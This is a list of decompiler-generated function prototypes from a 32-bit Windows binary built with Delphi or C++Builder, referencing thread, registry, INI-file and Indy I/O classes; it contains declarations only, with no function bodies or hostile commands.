int __fastcall sub_42B770(int a1, char a2, char a3);
int sub_42B7D0();
// int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(Classes::TCustomMemoryStream *this, int, int, int, void *, int); idb
int sub_42B880();
int __fastcall sub_42B8B0(Classes::TCustomMemoryStream *this); // idb
int __fastcall sub_42B900(__int64 (__fastcall ***this)(Classes::TStream *), const void *a2, int a3);
_DWORD *__fastcall sub_42BBA0(_DWORD *lp);
_DWORD *__fastcall sub_42BC00(_DWORD *lp);
int __fastcall sub_42BC60(_DWORD *a1);
int __fastcall sub_42BC90(_DWORD *lp);
int __fastcall sub_42BCE0(int a1);
int __fastcall sub_42BD10(int a1);
int __fastcall sub_42BD40(int a1, BOOL *a2);
int __fastcall sub_42BDE0(int a1, BOOL *a2);
int __fastcall sub_42BE80(_DWORD *a1, BOOL *a2);
int __fastcall sub_42BEB0(_DWORD *a1, BOOL *a2);
int __fastcall sub_42BEE0(_DWORD *a1, BOOL *a2);
// _DWORD *__usercall sub_42BF50@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4);
// BOOL __usercall sub_42C040@<eax>(void *a1@<eax>, int a2);
// int __usercall sub_42C0D0@<eax>(int a1@<edi>, int a2);
// int __usercall sub_42C220@<eax>(int a1@<edi>);
// int __usercall sub_42C240@<eax>(int a1@<edi>);
int __fastcall sub_42C250(_DWORD **a1);
// int __userpurge sub_42C270@<eax>(int a1@<eax>, char a2@<dl>, char a3@<cl>, int a4@<edi>, char a5);
bool __fastcall sub_42C2D0(int a1, const void *a2, char a3);
// _DWORD *__usercall sub_42C310@<eax>(_DWORD *result@<eax>, int a2@<edi>);
int __fastcall sub_42C3E0(int a1, LPCVOID lpAddress, char a3);
int __fastcall sub_42C470(int a1, const void *a2);
bool __fastcall sub_42C500(int a1, const void *a2);
bool __fastcall sub_42C520(int a1, const void *a2);
int __fastcall sub_42C570(int a1, char a2);
int sub_42C5B0();
// int __usercall sub_42C630@<eax>(int a1@<eax>, int a2@<edi>);
int __fastcall sub_42C830(int result, _DWORD **a2);
_DWORD *sub_42C8C0();
int __fastcall sub_42CBC0(int a1, signed int a2, signed int a3);
int __fastcall sub_42CCC0(int a1, int a2, int a3);
_DWORD *__fastcall sub_42CDF0(void *a1, int a2);
int sub_42CE40(); // weak
int sub_42CE50(); // weak
int sub_42CE60(); // weak
int __fastcall sub_42CE70(int a1, int a2);
int __fastcall sub_42CE90(_BYTE *a1);
_BYTE *__fastcall sub_42CEA0(_BYTE *result, unsigned int a2);
// _DWORD __stdcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD); weak
int sub_42CF50();
_DWORD *__fastcall sub_42CFA0(int a1, _BYTE *a2, _DWORD *a3);
_DWORD *__fastcall sub_42D010(int a1, unsigned int lpString1, _DWORD *a3);
_DWORD *__fastcall sub_42D0F0(int a1, _BYTE *a2, char a3, _DWORD *a4);
bool __cdecl sub_42D330(int a1);
_BYTE *__cdecl sub_42D350(int a1);
_BYTE *__cdecl sub_42D380(int a1);
// _DWORD *__usercall sub_42D3C0@<eax>(_DWORD *a1@<eax>, int a2);
int __cdecl sub_42D420(int a1);
int __cdecl sub_42D460(int a1);
// int __usercall sub_42D4A0@<eax>(int a1@<eax>, int a2);
_BYTE *__cdecl sub_42D4E0(int a1);
// int __usercall sub_42D510@<eax>(char a1@<al>, int a2);
// BOOL __usercall sub_42D540@<eax>(int a1@<eax>, int a2);
// int __usercall sub_42D610@<eax>(int a1@<eax>, int a2);
int __fastcall sub_42D6F0(int *a1);
int __fastcall sub_42D960(int a1, unsigned int a2);
unsigned int __fastcall sub_42D9C0(int a1, unsigned int a2);
volatile __int32 *__fastcall sub_42DA10(int a1, int a2, volatile __int32 *a3);
volatile __int32 *__fastcall sub_42DA50(int a1, int a2, volatile __int32 *a3);
volatile __int32 *__fastcall sub_42DA90(int a1, int a2, char a3, volatile __int32 *a4);
int __fastcall sub_42DAD0(int *a1, int a2, int a3, _BYTE *a4, CHAR *lpString1);
int __fastcall sub_42DC50(int a1, unsigned int a2, _DWORD *a3);
unsigned int __fastcall sub_42DCD0(_DWORD *a1, int a2, int a3);
int __fastcall sub_42DE90(int result, int a2, int a3);
volatile __int32 *__fastcall sub_42DEA0(int *a1, unsigned int a2, volatile __int32 *a3);
int __fastcall sub_42DEF0(int a1, unsigned int a2);
int sub_42DF20();
char sub_42DF30();
int __fastcall sub_42DF40(int *a1, unsigned int a2, _DWORD *a3, volatile __int32 *a4);
int __fastcall nullsub_6(_DWORD, _DWORD, _DWORD); // weak
int __fastcall sub_42DFE0(_DWORD *a1, int a2, int a3);
_DWORD *__fastcall sub_42E110(int *a1);
int __fastcall sub_42E200(_DWORD *a1, int a2, int a3, int a4, int a5);
volatile __int32 *__fastcall sub_42E310(int *a1, unsigned int a2, volatile __int32 *a3);
int sub_42E3B0();
// int __usercall sub_42E6F0@<eax>(int a1@<ebx>);
// volatile __int32 *__usercall sub_42E780@<eax>(volatile __int32 *result@<eax>, int a2);
int __fastcall sub_42E7E0(int a1, volatile __int32 *a2);
int sub_42E880();
// int __usercall sub_42EB80@<eax>(int a1@<ebx>);
BOOL __fastcall sub_42EBB0(int a1, int a2, _DWORD *a3, _DWORD *a4);
BOOL __fastcall sub_42EC90(int a1, int a2, _DWORD *a3, _DWORD *a4);
BOOL __fastcall sub_42EE00(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5);
// _DWORD __fastcall Idiohandler::TIdIOHandler::Write(Idiohandler::TIdIOHandler *__hidden this, char); idb
// int __usercall sub_42EF60@<eax>(int a1@<ebx>);
void sub_42F2A0();
int __fastcall sub_42F2D0(LPCVOID lpAddress, int a2);
int __fastcall sub_42F380(LPCVOID lpAddress, int a2, int a3);
// int __usercall sub_42F430@<eax>(int *a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
int __fastcall sub_42F510(const void *a1, _BYTE *a2, int *a3);
int __fastcall sub_42F5D0(const void *a1, char a2, _DWORD *a3);
int __fastcall sub_42F850(int a1, int a2);
int __fastcall sub_42F870(int a1, int a2);
int __fastcall sub_42F910(int a1, int a2);
int __fastcall sub_42F980(int a1, unsigned int System::AnsiString);
int __fastcall sub_42F9A0(int a1, LPCVOID lpAddress, _WORD *a3);
void sub_42FA10();
int sub_42FA50();
int __fastcall sub_42FAA0(int a1, int a2, int a3);
// int __usercall sub_42FB80@<eax>(int a1@<eax>, int a2@<ebx>);
BOOL __fastcall sub_42FC50(int a1, int a2, int a3);
char __fastcall sub_42FD90(int a1);
int __fastcall sub_42FE10(int *a1, char a2, char a3, int *a4);
_DWORD *sub_4301B0();
int __fastcall sub_430720(int a1);
int *__fastcall sub_430790(int a1);
// int *__userpurge sub_4307C0@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>, long double a4@<st0>, int a5);
// int *__userpurge sub_430800@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>, long double a4@<st0>, int a5, int a6);
int sub_430840();
int sub_430860();
// int __usercall sub_430880@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, int a3@<ebx>, int a4@<edi>);
// int __usercall sub_4308B0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
int __fastcall sub_4308E0(int a1);
// int *__usercall sub_430930@<eax>(char a1@<al>, HANDLE hThread@<edx>, long double a3@<st0>);
// int *__usercall sub_4309F0@<eax>(char a1@<al>, DWORD dwThreadId@<edx>, long double a3@<st0>);
// int __usercall sub_430A60@<eax>(int a1@<eax>, char a2@<dl>, long double a3@<st0>);
int sub_430AC0();
// int __userpurge sub_430B20@<eax>(int a1@<eax>, char a2@<dl>, char a3@<cl>, long double a4@<st0>, int a5, int a6, int a7, int a8);
int sub_430C10();
char __fastcall sub_430C60(int a1, unsigned int **a2, _DWORD *a3);
// BOOL __usercall sub_430DD0@<eax>(int a1@<eax>, unsigned int a2@<edx>, _DWORD *a3@<ecx>, BOOL a4@<ebx>);
bool __fastcall sub_430FB0(int a1, unsigned int a2);
char __fastcall sub_430FC0(int a1);
void __fastcall sub_431050(int *a1);
int __fastcall sub_431120(int a1);
// _DWORD *__usercall sub_431130@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int8 a3@<cl>, int a4@<edi>);
int __fastcall sub_431240(int a1, unsigned int System::AnsiString);
int __fastcall sub_431260(int a1, int *a2);
// _DWORD __stdcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD); weak
_DWORD *__fastcall sub_431310(int a1, int a2);
BOOL __fastcall sub_4315E0(int a1, int *a2, _DWORD *a3);
// int __fastcall Dbxplatformutil::TDBXTokenizer::TDBXTokenizer(_DWORD, _DWORD, _DWORD); weak
// int __fastcall sub_431760(_DWORD, _DWORD, _DWORD); weak
int __fastcall sub_431960(int a1, int a2);
int __fastcall sub_431990(int a1, unsigned int System::AnsiString);
int __fastcall sub_4319B0(int a1);
void sub_431A40();
int __fastcall sub_431AD0(int a1, int *a2);
int __fastcall sub_431B60(int a1, int a2, int a3);
int __fastcall sub_431C20(int a1, int a2);
int __fastcall sub_431C40(int a1, int a2);
int __fastcall sub_431C60(int a1, int a2);
_DWORD *sub_431CB0();
bool __fastcall sub_431CD0(int *a1);
// int *__userpurge sub_431D00@<eax>(int a1@<edx>, char a2@<cl>, long double a3@<st0>, int a4);
char sub_431D60();
char sub_431DA0();
// char __userpurge sub_431DD0@<al>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, long double a4@<st0>, int a5);
// int __userpurge sub_431E90@<eax>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, long double a4@<st0>, int a5);
int __fastcall sub_431F10(int a1);
// int *__usercall sub_431F80@<eax>(int a1@<eax>, long double a2@<st0>);
// int __userpurge sub_431FF0@<eax>(long double a1@<st0>, int a2, int a3, int a4, int a5, int a6);
int __fastcall sub_432070(_DWORD *a1);
// void __stdcall RaiseException_2(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
int sub_4320B0();
int sub_432200();
// void __usercall __noreturn sub_432410(int *a1@<eax>, const void *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
void *sub_432460();
// int __usercall sub_432480@<eax>(int a1@<eax>, int a2@<edx>, int a3@<esi>);
DWORD __fastcall sub_432F80(int a1);
BOOL __fastcall sub_432FA0(int a1, int a2);
int __fastcall sub_433000(int a1);
int __fastcall sub_433040(int a1, char a2, int a3, char a4, char a5);
int sub_433100();
// int __usercall sub_433170@<eax>(int *a1@<eax>, char a2@<dl>, int *a3@<ecx>, int a4@<edi>, int a5@<esi>);
_DWORD *__fastcall sub_4333E0(int a1, int a2, int a3);
_DWORD *__fastcall sub_433460(int a1, int a2, int a3);
// int __userpurge sub_4334E0@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>, char a6);
int __fastcall sub_4335E0(DWORD a1, int a2);
int __fastcall sub_433830(int a1, char a2, DWORD a3, int a4);
// int __usercall sub_4338D0@<eax>(unsigned int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
// int __userpurge sub_433940@<eax>(int a1@<eax>, void *a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>, char a7);
_DWORD *__fastcall sub_433B30(int a1, int a2, const void *a3);
BOOL __fastcall sub_433BC0(int a1);
_DWORD *__fastcall sub_433BE0(int a1, int a2, int a3);
__int64 sub_433C60();
_DWORD *__fastcall sub_433C90(int *a1);
// _DWORD *__usercall sub_433DA0@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, void *a3@<ecx>, long double a4@<st0>);
_DWORD *__fastcall sub_433F40(int a1, void *a2, void *a3);
void __stdcall sub_4341F0(int a1, int a2, int a3);
void __fastcall sub_434210(int a1, int a2);
_DWORD *__fastcall sub_434240(int a1, BOOL *a2);
int __fastcall sub_4342A0(int a1, int a2, void *a3);
char sub_4344A0();
// int __usercall sub_4347C0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<edi>);
// int __userpurge sub_434820@<eax>(_DWORD *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<edi>, int a4);
// int __usercall sub_4348D0@<eax>(int result@<eax>, int a2);
// _DWORD *__usercall sub_434930@<eax>(BOOL *a1@<eax>, int a2);
int __cdecl sub_4349F0(int a1);
// int __usercall sub_434A50@<eax>(int result@<eax>, int a2@<ecx>, int a3);
// _DWORD *__usercall sub_434A80@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
// int __usercall sub_434C80@<eax>(int a1@<eax>, int a2);
// _DWORD *__usercall sub_434F80@<eax>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4@<edi>);
int __fastcall sub_4350D0(int a1, char a2, _DWORD *a3, int a4);
int __fastcall sub_435190(int a1);
int __fastcall sub_4351B0(int a1, _WORD *a2);
int __fastcall sub_435200(int a1, _WORD *a2);
int __fastcall sub_435250(int a1, _WORD *a2);
int __fastcall sub_4352A0(int a1, _WORD *a2);
int __fastcall sub_4352F0(int a1, _WORD *a2);
int __fastcall sub_435330(int a1, _WORD *a2);
int __fastcall sub_4353B0(int a1, char *a2);
bool __fastcall sub_4353E0(int a1, char *a2);
int __fastcall sub_4353F0(int a1, _WORD *a2);
// int __usercall sub_435580@<eax>(int a1@<eax>, _WORD *a2@<edx>, void *a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
// int __usercall sub_435840@<eax>(int a1@<eax>, _WORD *a2@<edx>, int a3@<ebx>);
// int __usercall sub_435920@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_4360E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
int __fastcall sub_4368B0(int a1, int a2, int a3);
bool __fastcall sub_436910(int a1, char *a2, int a3);
_DWORD *__fastcall sub_436990(int a1);
int __fastcall sub_4369C0(int result, char a2);
// char __usercall sub_436A80@<al>(int a1@<eax>, int a2);
int __fastcall sub_436AD0(int a1, int a2, int a3, int *a4);
_DWORD *__fastcall sub_437000(int a1);
// _DWORD __stdcall unknown_libname_142(_DWORD); weak
// _DWORD *__usercall sub_4370F0@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<edi>);
int __fastcall sub_4371A0(int a1, int a2, int a3);
// int __usercall sub_4372D0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ebx>);
// int __usercall sub_4373C0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ebx>);
// int __usercall sub_4374F0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// int __usercall sub_4375B0@<eax>(int a1@<eax>, int a2@<ebx>);
int __fastcall sub_437620(int result, int a2, int a3);
// int __usercall sub_437630@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
int __fastcall sub_437690(int a1);
int __fastcall sub_4376E0(_DWORD *a1, int a2);
int __fastcall sub_437710(int a1, int a2);
_WORD *__fastcall sub_437740(_DWORD *a1, __int16 a2, int a3);
int __fastcall sub_437770(_DWORD *a1, int a2, int a3);
int __fastcall sub_4377A0(_DWORD *a1);
int __fastcall sub_4377C0(_DWORD *a1);
int __fastcall sub_438600(int a1);
_DWORD *sub_4386C0();
int __fastcall sub_438770(int a1);
// int __usercall sub_4387D0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int __fastcall sub_438840(int a1);
// int __usercall sub_4388A0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_438970@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_438990@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_4389D0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int __fastcall sub_4389F0(_DWORD *a1, _DWORD *a2);
char __fastcall sub_438FC0(_BYTE *a1, int a2);
// _DWORD *__usercall sub_439030@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
char __fastcall sub_4390F0(_BYTE *a1, int a2);
bool __fastcall sub_439160(int *a1, int a2);
_DWORD *__fastcall sub_439190(_DWORD *result);
// _DWORD *__usercall sub_4391B0@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
char __fastcall sub_439270(_BYTE *a1, int a2);
bool __fastcall sub_4392E0(int *a1, _DWORD *a2);
// _DWORD *__usercall sub_439320@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
char __fastcall sub_4393E0(_BYTE *a1, int a2);
bool __fastcall sub_439450(int *a1, int a2);
// _DWORD *__usercall sub_4394A0@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
char __fastcall sub_439560(_BYTE *a1, int a2);
bool __fastcall sub_4395D0(int *a1, int a2);
// _DWORD *__usercall sub_439660@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
int __fastcall sub_439720(_DWORD *a1, int a2, int a3);
_DWORD *__fastcall sub_439850(_DWORD *result);
// int __usercall sub_439860@<eax>(_DWORD *a1@<edx>, unsigned int a2@<ecx>, int a3@<edi>);
// int __usercall sub_4398E0@<eax>(_DWORD *a1@<edx>, unsigned int a2@<ecx>, int a3@<edi>);
int sub_439960();
// int __usercall sub_4399F0@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
int sub_439B70();
int __fastcall sub_439CC0(int a1, unsigned __int8 *a2, int a3);
int sub_439E30();
int __fastcall sub_439FC0(int a1, unsigned __int8 *a2, int a3);
int sub_43A130();
int __fastcall sub_43A380(int a1, unsigned __int8 *a2, int a3);
int sub_43A4F0();
int __fastcall sub_43A940(int a1, unsigned __int8 *a2, int a3);
int __fastcall sub_43AAB0(int a1);
int __fastcall sub_43AAC0(int result);
int __fastcall sub_43AAD0(int result, _BYTE *a2, int a3);
int __fastcall sub_43AB10(_DWORD *a1, _DWORD *a2);
_DWORD *__fastcall sub_43ABB0(_DWORD *result);
int __fastcall sub_43AC00(int result, _DWORD *a2, unsigned int a3);
int __fastcall sub_43ACC0(int a1);
// int __usercall sub_43ACF0@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_43AD80@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// int __usercall sub_43AE50@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_43AF30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
// int __usercall sub_43AFA0@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_43B050@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_43B0E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// int __usercall sub_43B150@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_43B1D0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
int sub_43B240();
int __fastcall sub_43B2D0(int a1);
int __fastcall sub_43B2F0(int a1, void *a2, unsigned int a3);
int __fastcall sub_43B330(int a1, int a2, int a3);
// int __usercall sub_43B370@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int sub_43B5B6(); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __fastcall sub_43BA80(int a1);
int __fastcall sub_43BAA0(int a1, void *a2, unsigned int a3);
int __fastcall sub_43BAF0(int a1, int a2, _DWORD *a3);
// int __usercall sub_43BB40@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
_DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD); // weak
int sub_43BDBA(); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __fastcall sub_43C290(int a1);
int __fastcall sub_43C2B0(int a1, void *a2, unsigned int a3);
// int __usercall sub_43C300@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
_DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD); // weak
int sub_43C57E(); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __fastcall sub_43CA60(int a1);
int __fastcall sub_43CA80(int a1, void *a2, unsigned int a3);
// int __usercall sub_43CAD0@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
_DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD); // weak
int sub_43CD56(); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __fastcall sub_43D240(int a1);
int __fastcall sub_43D260(int a1, void *a2, unsigned int a3);
// int __usercall sub_43D2B0@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
_DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD); // weak
int sub_43D536(); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
void __fastcall __noreturn sub_43DB60(int a1, int a2, int a3);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// int __usercall sub_43DC21@<eax>(int a1@<ebx>);
Classes::TThread *__fastcall sub_43DC30(Classes::TThread *this, char a2, int a3, int a4);
// _DWORD *__usercall sub_43DCB0@<eax>(int a1@<edi>);
bool __fastcall sub_43DD30(int a1, int a2);
BOOL __fastcall sub_43DD50(int a1);
BOOL __fastcall sub_43DD60(int a1);
BOOL __fastcall sub_43DD70(int a1);
bool __fastcall sub_43DD80(Classes::TThread *this, int a2);
// _DWORD __fastcall Classes::TThread::TThread(Classes::TThread *__hidden this, bool); idb
// _DWORD *__usercall sub_43DE90@<eax>(int a1@<edi>);
int __fastcall sub_43DF20(int a1);
// int __usercall sub_43DF70@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_43E1B0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// _DWORD __fastcall Classes::TThread::Terminate(Classes::TThread *__hidden this); idb
// DWORD __usercall sub_43E1D0@<eax>(int a1@<eax>, int a2@<edi>);
// _DWORD *__usercall sub_43E210@<eax>(int dwMessageId@<edx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_43E290@<eax>(int result@<eax>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_43E2B0(char a1@<dl>, int a2@<edi>, int a3@<esi>);
void sub_43E2D0();
int __fastcall sub_43E5A0(int a1, int a2, int a3);
int __fastcall sub_43E610(int a1);
// int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD); weak
int sub_43E6E0();
_DWORD *__fastcall sub_43E710(int a1, int a2);
unsigned int __fastcall sub_43E770(int a1, int a2);
int __fastcall sub_43E7B0(int a1, int a2);
// int __usercall sub_43E7E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
int __fastcall sub_43E940(int a1, char a2);
int __fastcall sub_43E9B0(int a1, unsigned int System::AnsiString);
int __fastcall sub_43EA30(int a1, unsigned int System::AnsiString, unsigned int a3);
int sub_43EAA0();
int __fastcall sub_43EAE0(int a1, int cchLength, char a3);
int __fastcall sub_43EB50(int a1, int cchLength, char a3);
// int __usercall sub_43EBC0@<eax>(int a1@<eax>, int a2@<ebx>);
_DWORD *__fastcall sub_43ED30(int a1);
int __fastcall sub_43EE40(int a1, int cchLength);
int __fastcall sub_43EED0(int a1, int a2);
int __fastcall sub_43EF00(int a1);
// int __userpurge sub_43EF70@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, _DWORD **a4@<edi>, char a5, int a6, char a7, char a8);
// int __usercall sub_43F0C0@<eax>(int a1@<eax>, int cchLength@<edx>, int a3@<ecx>, int a4@<esi>);
// int __usercall sub_43F170@<eax>(const void *a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_43F210@<eax>(int a1@<eax>, int cchLength@<edx>, int a3@<edi>, int a4@<esi>);
int __fastcall sub_43F2B0(int a1);
_DWORD *__fastcall sub_43F310(int (__fastcall ***a1)(_DWORD, int, int, volatile __int32 *), int a2, void *a3, volatile __int32 *a4);
// int __usercall sub_43F3E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// int __usercall sub_43F6E0@<eax>(char a1@<al>, int a2);
int __fastcall sub_43F890(int a1, int a2, int a3, _DWORD *a4);
int __fastcall sub_43F980(int a1, int a2);
int __fastcall sub_43FA00(int a1);
// _DWORD *__usercall sub_43FA60@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int a3@<edi>);
// _DWORD *__usercall sub_43FBF0@<eax>(int a1@<eax>, _DWORD **a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_43FE20@<eax>(_DWORD *result@<eax>, const void *a2@<ebx>, int a3@<edi>, int a4@<esi>);
// _DWORD __stdcall Registry::TRegIniFile::ReadBool(char); weak
// _DWORD __stdcall Xmldoc::TXMLNodeList::Delete(_DWORD); weak
// _DWORD __cdecl sub_43FED0(_DWORD); weak
int __fastcall sub_4400F0(int a1, int a2, int a3);
// int __usercall sub_440190@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// int __usercall sub_440320@<eax>(char a1@<al>, int a2@<edi>, int a3);
// int __usercall sub_4404E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
// int __usercall sub_440580@<eax>(char a1@<al>, int a2@<edi>, int a3);
int sub_440788(); // weak
// int __usercall sub_440790@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
volatile __int32 *__fastcall sub_440830(int (__fastcall ***a1)(_DWORD, int, int, volatile __int32 *), int a2, int a3, int a4, volatile __int32 *a5);
// _DWORD *__usercall sub_440870@<eax>(int a1@<eax>, const void *a2@<ebx>, int a3@<edi>, int a4@<esi>);
int __fastcall sub_440D40(int a1, int a2, int a3);
int __fastcall sub_440DE0(int a1, char a2);
// int __usercall sub_440E30@<eax>(int a1@<eax>, Idthreadcomponent::TIdThreadComponent *a2@<edx>, int a3@<edi>);
int __fastcall sub_4410A0(int (__fastcall ***a1)(_DWORD, int), int a2);
// _DWORD __fastcall Inifiles::TCustomIniFile::WriteInteger(_DWORD, DWORD cchLength, DWORD, _DWORD); weak
// int __usercall sub_441110@<eax>(int a1@<eax>, _DWORD *cchLength@<edx>, Idthreadcomponent::TIdThreadComponent *a3@<ecx>, int a4@<edi>, int a5@<esi>);
// int __userpurge sub_441320@<eax>(int a1@<eax>, int cchLength@<edx>, DWORD a3@<ecx>, int a4@<edi>, void *a5);
void sub_4416A0();
// _DWORD *__usercall sub_441700@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, int *a3);
// char __userpurge sub_4417B0@<al>(WPARAM a1@<eax>, HWND a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>, char a6, int a7, int a8, int a9);
// int __usercall sub_4419A0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_4419D0@<eax>(int a1@<edi>);
_DWORD *__fastcall sub_441A20(int *a1);
int *sub_441AB0();
HINSTANCE __fastcall sub_441AD0(int a1, int a2, int a3, int a4, int a5);
int __fastcall sub_441B80(HWND a1, int a2, int a3, UINT uType);
_DWORD *__fastcall sub_441BC0(int a1, void *a2, volatile __int32 *a3);
char sub_441D80();
_DWORD *__fastcall sub_441DD0(int a1, int a2, int a3, volatile __int32 *a4);
volatile __int32 *__fastcall sub_441EC0(int a1, int a2, int a3);
HKEY __fastcall sub_441EF0(int a1);
int __fastcall sub_441F30(int a1, char a2, int a3, char a4);
Registry::TRegistry *__fastcall sub_441F90(Registry::TRegistry *a1, __int32 a2);
int sub_442170();
// _DWORD __fastcall Registry::TRegistry::GetBaseKey(Registry::TRegistry *__hidden this, bool); idb
DWORD __fastcall sub_4421C0(int a1, int a2, BYTE *a3, DWORD cbData, char *a5);
int __fastcall sub_442250(int a1, int a2, int a3);
int __fastcall sub_4422D0(int a1, int a2);
// _DWORD __fastcall Registry::TRegistry::GetKey(Registry::TRegistry *__hidden this, const int System::AnsiString); idb
LONG __fastcall sub_4423B0(int a1, _WORD *lpcSubKeys);
// _DWORD __fastcall Registry::TRegistry::KeyExists(Registry::TRegistry *__hidden this, const int System::AnsiString); idb
BOOL __fastcall sub_4424B0(_DWORD *a1, __int32 a2, char a3);
